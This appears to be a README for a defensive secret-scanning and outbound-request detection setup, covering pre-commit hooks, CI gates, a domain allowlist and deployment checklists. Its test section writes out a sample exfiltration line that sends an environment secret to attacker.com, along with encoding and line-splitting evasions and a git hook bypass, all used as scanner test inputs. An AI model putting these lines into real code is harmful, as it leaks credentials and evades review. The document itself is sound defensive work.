# ZeroLeak Security Engine - Hardened Setup

## 🛡️ Defense Architecture

### Security Layers

| Layer | Component | Purpose |
|-------|-----------|---------|
| Local | Pre-commit hook | Blocks commits with secrets |
| CI/CD | Dual-layer scanning | Secret detection + AppSec behavior detection |
| GitHub | Secret scanning | External enforcement |
| Runtime | Domain allowlist | Blocks unknown outbound requests |

---

## 🔧 Components

### 1. Secret Detection (`security/scan-secrets.js`)

Detects:
- 16 secret patterns (Slack, OpenAI, Firebase, AWS, GitHub, Stripe, etc.)
- Base64 encoded secrets with automatic decoding
- Line-splitting attacks via content normalization
- Commit message leaks
- Binary file scanning

**Usage:**
```bash
node security/scan-secrets.js              # Scan all files
node security/scan-secrets.js --staged     # Scan staged files only
node security/scan-secrets.js --silent     # CI mode (no output)
node security/scan-secrets.js --fix       # Generate cleanup script
```

### 2. AppSec Detection (`security/appsec-scan.js`)

Detects behavior-based attacks:
- Exfiltration attempts (fetch/axios with env vars)
- Code fragmentation (URL + env var concatenation)
- Unknown domain usage
- Secret usage in network requests

**Domain Allowlist:**
```javascript
const ALLOWED_DOMAINS = [
  "api.openai.com",
  "api.groq.com",
  "api.anthropic.com",
  "slack.com",
  "hooks.slack.com",
  "firebaseio.com",
  "firebaseapp.com",
  "firebasestorage.app",
  "github.com",
  "api.github.com",
  "vercel.com",
  "vercel.app",
  "localhost",
  "127.0.0.1"
];
```

**Usage:**
```bash
node security/appsec-scan.js              # Scan all code files
node security/appsec-scan.js --silent     # CI mode
```

### 3. CI/CD Security Gate (`.github/workflows/secret-scan.yml`)

**Pipeline:**
1. Checkout repository
2. Setup Node.js
3. Run secret detection (fails on detection)
4. Run AppSec detection (fails on detection)
5. Upload security logs on failure

**Status:**
- ✅ Secret detection: Enforced
- ✅ AppSec detection: Enforced
- ✅ Artifact upload: On failure

---

## 🔒 Security Baseline Rules

### 1. Non-Bypassable Pipeline

**Rule:** CI is the source of truth, not local hooks.

**Requirements:**
- ❌ Direct push to `main` blocked
- ✅ PR required for all changes
- ✅ CI must pass before merge

**GitHub Settings Required:**
- Enable branch protection for `main`
- Require PR review
- Require status checks to pass

### 2. High-Risk File Protection

**Protected Paths:**
- `.github/workflows/**`
- `security/**`
- `.env*`

**Requirement:** Require review before merge

### 3. Secret Isolation

**Environments:**
- `dev` - Development secrets
- `preview` - Preview deployment secrets
- `prod` - Production secrets

**Rule:** Production secrets NEVER exist locally

### 4. Alert Visibility

**Alert Channels:**
- CI failures → GitHub Actions logs
- Scanner detections → Slack webhook
- Security logs → Artifact upload (30-day retention)

---

## 🧪 Continuous Attack Testing

### Test Scenarios

Run before each release or weekly:

```bash
# 1. Base64 encoding test
echo "aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvWFhY" > test.txt
node security/scan-secrets.js

# 2. Line-splitting test
echo -e "https://hooks.slack.com/services/\nXXX/YYY/ZZZ" > test.txt
node security/scan-secrets.js

# 3. Exfiltration test
echo 'fetch("https://attacker.com/log?data=" + process.env.SLACK_WEBHOOK_URL);' > test.js
node security/appsec-scan.js

# 4. Fragmentation test
echo 'const part1 = "https://hooks.slack.com/services/";\nconst part2 = process.env.SECRET;' > test.js
node security/appsec-scan.js

# 5. Bypass test
git commit --no-verify -m "bypass hook"
# Should be blocked by CI
```

**Expected Result:** All tests should be detected and blocked.

---

## 🚀 Deployment Checklist

### Before Deployment

- [ ] Run `node security/scan-secrets.js` (no secrets detected)
- [ ] Run `node security/appsec-scan.js` (no AppSec issues detected)
- [ ] Verify CI workflow passes
- [ ] Check Slack webhook is configured
- [ ] Verify domain allowlist is current

### GitHub Settings

- [ ] Enable Secret Scanning
- [ ] Enable Push Protection
- [ ] Enable branch protection for `main`
- [ ] Require PR review for protected paths
- [ ] Require status checks to pass

### Vercel Settings

- [ ] Separate environments (dev/preview/prod)
- [ ] Production secrets never in local `.env`
- [ ] Enable outbound request monitoring

---

## 📊 Security Maturity

| Level | Capability | Status |
|-------|------------|--------|
| Level 1: Prevent accidental leaks | Pattern-based detection | ✅ Complete |
| Level 2: Resist basic attackers | Evasion technique hardening | ✅ Complete |
| Level 3: Defend against real attacks | AppSec heuristic detection | ✅ Complete |

---

## ⚠️ Remaining Gaps

### Manual Configuration Required

1. **CI Workflow Locking:**
   - Enable branch protection on GitHub
   - Require PR review for `.github/workflows/*`

2. **Outbound Request Monitoring:**
   - Configure Vercel domain allowlist
   - Block unknown domains

3. **Environment Variable Policy:**
   - Separate dev/preview/prod in Vercel
   - Restrict access scope

4. **GitHub Secret Scanning:**
   - Enable in repo settings
   - Enable Push Protection

### Human Risks

The system cannot prevent:
- Approving malicious PRs
- Whitelisting bad domains
- Reusing compromised secrets

**Mitigation:** Code review + audit logs

---

## 🛡️ Defense in Depth

```
┌─────────────────────────────────────────┐
│         Developer Commit                │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│    Pre-commit Hook (Local Gate)         │
│  - Secret detection                     │
│  - Staged content scanning              │
│  - Commit message scanning              │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│         CI/CD Pipeline (Hard Gate)      │
│  - Secret detection (--silent)          │
│  - AppSec behavior detection            │
│  - Security log upload                  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│      GitHub Enforcement (Policy)       │
│  - Secret scanning                      │
│  - Push protection                      │
│  - Branch protection                    │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│       Runtime (Last Defense)            │
│  - Domain allowlist                     │
│  - Outbound request monitoring          │
└─────────────────────────────────────────┘
```

---

## 📞 Support

**Documentation:**
- `security/scan-secrets.js` - Secret detection scanner
- `security/appsec-scan.js` - AppSec behavior scanner
- `security/patterns.js` - Detection patterns
- `security/entropy.js` - Entropy calculator
- `security/alert.js` - Slack alert system

**Installation:**
```bash
# Install pre-commit hook (Windows)
powershell -ExecutionPolicy Bypass -File security\install-hook.ps1

# Install pre-commit hook (Unix/Linux)
cp security/pre-commit .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
```

---

**ZeroLeak Security Engine - Hardened Setup Complete**
